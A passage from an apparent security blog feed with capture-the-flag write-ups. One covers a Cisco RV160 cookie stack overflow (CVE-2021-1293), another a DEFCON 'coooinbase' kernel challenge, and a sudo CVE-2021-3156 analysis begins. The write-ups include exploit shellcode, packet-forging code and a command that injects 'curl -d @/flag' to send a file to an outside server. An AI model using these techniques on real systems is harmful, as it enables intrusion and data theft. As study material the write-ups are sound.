href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py</a></p></li></ol><h2 id="RV"><a href="#RV" class="headerlink" title="RV"></a>RV</h2><p>题目描述：</p><blockquote><p>Cisco RV160 Router behind iOA!<br>remote version is <code>1.0.01.01</code>.<br><a href="http://10.1.1.1/">http://10.1.1.1</a></p></blockquote><p>这个题目呢， 是一个 Cisco RV160的 1day题，这题也是比较可惜的。其实能做出来的，因为之前我刚好也给思科报过 RV160的洞，是一个httpd上的栈溢出，刚好也是这个版本。但是打比赛的时候为了省事， 想用 cgi 的命令注入打， 没打成功，而且不管访问什么当时都是返回 403 错误，一度让我怀疑人生</p><p>赛后才知道， 由于主办方是 docker + qemu 启动的， 猜测导致有些环境变量有问题，因此在403 check 的时候过不去，因此根本到不了执行 cgi 的位置。</p><p>然后在这里我打算公开这个的漏洞的细节，以及在这个题目上的利用， 这个漏洞应该是去年报告的，编号为  CVE-2021-1293</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png"></a></p><h3 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h3><p>在处理 cookie 的时候，会存在溢出栈溢出。</p><p>（1） 首先在 httpd handle 中， cookie 的指针会赋值到一个全局变量里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(s1, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  nptr = s1 + <span class="number">7</span>;</span><br><span class="line">  v11 = <span class="built_in">strspn</span>(s1 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">  nptr += v11;</span><br><span class="line">  Cookie = (<span class="keyword">int</span>)nptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2） 然后在 check_need_login 函数中, 会判断哪些 uri 需要登录    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v33 = check_need_login(v25);</span><br><span class="line"><span class="keyword">if</span> ( v33 )</span><br><span class="line">  v38 = check_Is_not_login_page((<span class="keyword">const</span> <span class="keyword">char</span> *)Cookie);</span><br><span class="line">v26 = <span class="built_in">printf</span>(<span class="string">&quot;=====is_login=%d, is_not_login_page=%d&quot;</span>, v38, v33);</span><br><span class="line"><span class="keyword">if</span> ( v39 || !v38 &amp;&amp; v33 )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_need_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !uri_string || !*(_BYTE *)uri_string )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;help&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;images/collapsed.png&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;cportal&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;index.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;login.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;alert0.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;confirm1.htm&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;check_is_not_login_page====res=%d&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如， 我访问  this_is_hack.htm ，这个url， 这个就符号需要登录的逻辑</p><p>(3) 然后 进入到 check_Is_not_login_page 函数中</p><p>在处理 sessionID 的过程中存在栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_16138</span><span class="params">(<span class="keyword">char</span> *cookie, <span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get_session_id   session=%s&quot;</span>, cookie);</span><br><span class="line">  s1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(cookie, <span class="string">&quot;sessionID&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( s1 = strtok(cookie, <span class="string">&quot; &quot;</span>); s1; s1 = strtok(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sessionID&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_15CE4(s1, byte_1FCD4, <span class="string">&quot;=&quot;</span>, v6, v5);</span><br><span class="line">.......</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>判断 cookie 是否有 <code>sessionID</code> 字符串， 如果存在则进到  <code>sub_15CE4</code> 函数, 然后就能看到明显的栈溢出漏洞 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  src = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( *sessionID &amp;&amp; <span class="built_in">strstr</span>(sessionID, a2) &amp;&amp; (src = strtok(sessionID, a2)) != <span class="number">0</span> )<span class="comment">// sub_15CE4(v14, &quot;;&quot;, &quot;=&quot;, v10, v4);</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, src);                             <span class="comment">// BOF</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, sessionID);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png"></a></p><p>溢出后，我们可以控制的， 看起来我们可以控制的寄存器只有 R11 ， 但实际上，返回后 R0 寄存器则是我们传入 cookie 参数的指针。</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" style="zoom: 50%;" /></a><p>因此我们可以在 payload 的前面直接放置 system 执行的命令，然后控制 PC跳转到 system 函数上（ httpd 程序本身有调用 httpd 的地方，不需要leak， 另外提一句，因为有 00 截断，因此我只能控制一次 PC 的地址，但是对这个环境来说足够了</p><p>另外这个题目在 0ctf 中是位于 iOA的后面的， 我们需要通过 iOA的vpn功能，访问内网中这个路由器，因此我们需要手撸一个 route 转发， 然后我们的圣博就直接用 scapy 简单撸了一个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.....</span><br><span class="line">base = ip2long(<span class="string">&#x27;172.31.0.0&#x27;</span>)</span><br><span class="line">m = login()</span><br><span class="line">req_vip(m, base + <span class="number">2</span>)</span><br><span class="line">sport = randint(<span class="number">1024</span>, <span class="number">65535</span>)</span><br><span class="line">ip = IP(src=<span class="string">&#x27;172.31.0.2&#x27;</span>, dst=<span class="string">&#x27;10.1.1.1&#x27;</span>)</span><br><span class="line">SYN = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">1000</span>)</span><br><span class="line">s = raw(ip / SYN)</span><br><span class="line">route(m, s)</span><br><span class="line">data = recv_packet(m)</span><br><span class="line">ack = IP(data)</span><br><span class="line">a = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;A&#x27;</span>, seq=ack.ack + <span class="number">1</span>, ack=ack.seq + <span class="number">1</span>)</span><br><span class="line">route(m, raw(ip / a))</span><br><span class="line">d = TCP(sport=sport, dport=<span class="number">80</span>, flags=<span class="string">&#x27;PA&#x27;</span>, seq=<span class="number">1001</span>, ack=ack.seq + <span class="number">1</span>) / payload.encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">route(m, raw(ip / d))</span><br><span class="line"></span><br><span class="line">m.interactive()</span><br></pre></td></tr></table></figure><p>最后利用 <code>curl -d @/flag server:port</code> 的命令获取了flag （另外不能有空格， 如果存在空格的话就会被截断，因此这里用了 ${IFS} 替换了空格）</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706143147.png" style="zoom:50%;" /></a><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/RV/RV.py">利用脚本</a>：</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py">http://bestwing.me/attachments/2021-TCTF-quals/RV/RV.py</a></p><p>binary idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/RV/mini/_httpd.idb">http://bestwing.me/attachments/2021-TCTF-quals/RV/mini\_httpd.idb</a></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>该漏洞已经修复， strcpy 函数换成了 strncpy 函数， 如果受到漏洞影响请尽快更新固件版本到最新版本。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf">https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv160-260-rce-XZeFkNHf</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CTF Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2021-1293" scheme="https://bestwing.me/tags/CVE-2021-1293/"/>
    
    <category term="TCTF" scheme="https://bestwing.me/tags/TCTF/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON 29 CTF Qualifier  coooinbase and coooinbase-kernel Write-up</title>
    <link href="https://bestwing.me/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html"/>
    <id>https://bestwing.me/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html</id>
    <published>2021-05-02T16:00:00.000Z</published>
    <updated>2021-05-03T20:09:20.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up"><a href="#DEFCON-29-CTF-Qualifier-coooinbase-amp-amp-coooinbase-kernel-Write-up" class="headerlink" title="DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up"></a>DEFCON 29 CTF Qualifier:  coooinbase &amp;&amp; coooinbase-kernel Write-up</h2><h3 id="coooinbase"><a href="#coooinbase" class="headerlink" title="coooinbase"></a>coooinbase</h3><p>题目描述：</p><blockquote><p>a simple service backed by special hardware for buying bitcoin: our beta testing server is live at <a href="http://52.6.166.222:4567/">http://52.6.166.222:4567</a> - this time attack the kernel!</p></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504004319.png"></a></p><p>图：1 题目服务首页</p><p>从题目的首页的 <code>custom hardware</code> 处可以下到题目的固件包。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" title="image-20210504004611006" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004611006.png" alt="image-20210504004611006"></a></p><p>图: 2 下载题目固件</p><p>可以看到固件包里包以下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  coooinbase tar -xvzf src</span><br><span class="line">x dist&#x2F;</span><br><span class="line">x dist&#x2F;x.rb</span><br><span class="line">x dist&#x2F;coooinbase.bin</span><br><span class="line">x dist&#x2F;rootfs.img</span><br><span class="line">x dist&#x2F;x.sh</span><br><span class="line">x dist&#x2F;x.html</span><br></pre></td></tr></table></figure><p>其中 <code>x.rb</code> 是 web 的后端服务，我们需要关注的代码逻辑如图:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" title="image-20210504004932474" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504004932474.png" alt="image-20210504004932474"></a></p><p>图3： x.rb 代码</p><p>阅读代码，我们可以知道一下几点：</p><ol><li>当我们访问 <code>/buy</code> api 的时候， 代码会请求 <code>HTTP_POST</code> 地址处的的 <code>/gen-bson</code> api, 当获取到 <code>/gen-bson</code> api 返回的数据后，会将数据写入 <code>pwn</code> 文件中，然后以重定向的形式喂入 <code>./x.sh</code> 文件</li><li><code>/gen-bson</code> 这个 api 会调用 <code>valid_credit_card</code> 和 <code>valid_association</code> 函数分别校验填入的 cardnumber 的合法性。 但是值得注意的是，这两个函数均会调用 <code>to_s.gusb(/\D/, &#39;&#39;)</code> 将传入的 <code>number</code> 变量中的非数字给去掉，但是在 44 -处的 <code>number</code> 却是仍然带有字符串的，因此此处我们可以传入其他非数字的值 （6011000000000004 这个cardnmumber 可以过校验）</li><li><code>gen-bson</code> 在45-46 行处会将参数转成 bson 格式，且 base64 编码， 然后返回</li></ol><p>（注： 此处还有有个点，我在一开始的时候没注意到，暂且不提）</p><p><code>x.sh</code> 的代码内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout 1 qemu-system-aarch64 -machine virt -cpu cortex-a57 -smp 1 -m 64M -nographic -serial mon:stdio -monitor none -kernel coooinbase.bin -drive <span class="keyword">if</span>=pflash,format=raw,file=rootfs.img,unit=1,<span class="built_in">readonly</span></span><br></pre></td></tr></table></figure><p>用 qemu 跑起一个服务， 内核为: <code>coooinbase.bin</code> 以及有对应的 rootfs.img , 通过以下命令可以将文件系统 mount 出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modprobe nbd max_part&#x3D;8</span><br><span class="line">qemu-nbd --connect&#x3D;&#x2F;dev&#x2F;nbd0 .&#x2F;rootfs.img</span><br><span class="line">mkdir rootfs</span><br><span class="line">mount &#x2F;dev&#x2F;nbd0 rootfs</span><br></pre></td></tr></table></figure><p>可以看到 文件系统中有三个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  rootfs ls</span><br><span class="line">bin  flg  run</span><br></pre></td></tr></table></figure><p>其中 bin 和 run , 通过逆向发现是一样的文件， flg 是flag 文件</p><p>猜测 bin （run) 就是要 pwn 的用户态程序， 通过启动命令，我们知道架构为 aarch64, cpu 为 cortex-a57, 我们使用 IDA  Pro 打开该文件， 设置如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" title="image-20210504012341867" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012341867.png" alt="image-20210504012341867"></a></p><p>图4：IDA 加载</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" title="image-20210504012534460" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504012534460.png" alt="image-20210504012534460"></a></p><p>图4：IDA分析截图</p><p>然后就必然发现 IDA 什么函数都没有分析出来， 所以我们需要修正下我们的 IDB，修复出函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" title="image-20210504014746398" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504014746398.png" alt="image-20210504014746398"></a></p><p>图5：修复后的 IDA 截图</p><p>在 <code>bsion_find_string</code> 中我们发现了一处动态分配栈空间的逻辑</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" title="image-20210504015258789" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504015258789.png" alt="image-20210504015258789"></a></p><p>图5：动态分配栈空间</p><p>在地址 0xB6C 处， X1 为传入的字符串大小， 此处判断需要动态分配的栈的大小 。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" title="image-20210504025826791" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504025826791.png" alt="image-20210504025826791"></a></p><p>图5：mapping 截图</p><p>但是这里存在一个问题， 这个没有判断传入的字符串大小是不是太大，如果太大的话， 例如我传入 0xf000 大小的字符串，那么此时将分配 0xf000 大小的栈， 即 <code>SP = SP - 0xffff</code>  , 由于栈在程序代码段的下方，此时将导致栈会被分配到代码段上，而且由于是 qemu 启动的程序，所有的段都是可写可执行的。</p><p>因此，这个题目的思路如下：</p><p>构造足够长的字符串，将栈分配之后将执行的代码段位置， 写入 shellcode 然后最后执行 shellcode. 由于程序有现成 open read write 的函数， 因此 shellcode 编写方便了许多，我们只需直接 call 函数即可。</p><p>shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag_path_name = <span class="number">0x715</span></span><br><span class="line">open_addr = <span class="number">0x340</span></span><br><span class="line">read_addr = <span class="number">0x34C</span></span><br><span class="line">write_addr = <span class="number">0x310</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:flag_path_name, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:open_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line"></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000088858</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x12&#x27;</span>:read_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x12&#x27;</span>:write_addr&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line">print(asm(shellcode))</span><br></pre></td></tr></table></figure><p>但是这里会出现一个坑点:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" title="image-20210504030941428" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504030941428.png" alt="image-20210504030941428"></a></p><p>ruby to bson 的时候得是 UTF-8 的字符集，这意味这在 x.rb 代码中的（见图4） 45 是过不去的， 然后在比赛的时候一度陷入试图把我的 shellcode 的修改为全为 UTF-8 字符集的艰苦工作中。 然后 peanuts 发现，  <code>HTTP_POST</code>  是由 HTTP header 中的 HOST字段控制的， 这以为我们不需要通过后端自身的 <code>/gen_bson</code> api 传入构造好的 payload ， 我们只需搭建我们自己的服务， 当接收到 <code>/gen_bson</code> 请求后， 传回我们的 payload。</p><h2 id="coooinbase-kernel"><a href="#coooinbase-kernel" class="headerlink" title="coooinbase-kernel"></a>coooinbase-kernel</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" title="image-20210504035715437" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035715437.png" alt="image-20210504035715437"></a></p><p>内核实现了几个syscall</p><p>其中 write 限制了读取的地址的范围</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" title="image-20210504035800048" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210504035800048.png" alt="image-20210504035800048"></a></p><p>但是 read 中没有限制写入的地址的范围</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210504035843.png"></a></p><p>因此这个题的思路为：</p><p>在已经完成的用户态任意代码执行的基础上</p><ol><li>open bin 文件，找到一个无意义的代码</li><li>lseek 到该处</li><li>read 该处的代码</li><li>通过 read 向内核的 write 的判断地址范围的地方写掉</li><li>调用 write 将内核地址中的 flag 打印出</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open</span></span><br><span class="line">shellcode = pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x0&#x27;</span>:<span class="number">0x715</span>, <span class="string">&#x27;x1&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x340</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fseek</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0x510</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x364</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000082A5C</span><span class="number">-4</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x34C</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&quot;MOV             X0, X6\n&quot;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x6&#x27;</span>:<span class="number">0xFFFF000000088858</span>,<span class="string">&#x27;x12&#x27;</span>:<span class="number">0x310</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;MOV X0, X6\n&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Defcon" scheme="https://bestwing.me/tags/Defcon/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156 sudo heap-overflow 漏洞分析</title>
    <link href="https://bestwing.me/CVE-2021-3156-analysis.html"/>
    <id>https://bestwing.me/CVE-2021-3156-analysis.html</id>
    <published>2021-01-31T16:00:00.000Z</published>
    <updated>2021-02-03T06:13:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>1 月26 日的时候， 有文章披露了 sudo 代码中存在 堆缓冲区溢出，于是花了漫长的时间尝试写相关利用, 本文以学习笔记为主。</p><p>完整利用可见：</p><p><a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><blockquote><p>The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.</p><p>Sudo is a powerful utility that’s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 